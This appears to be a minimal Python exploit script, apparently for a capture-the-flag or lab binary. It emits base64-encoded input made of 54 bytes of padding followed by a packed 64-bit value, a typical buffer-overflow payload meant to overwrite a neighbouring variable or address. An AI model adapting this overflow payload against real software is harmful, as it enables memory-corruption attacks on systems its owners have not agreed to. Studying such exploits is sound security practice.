
import sys
import struct
import base64

buf = b'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb'
buf += struct.pack('<Q', 1443258957049788617)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
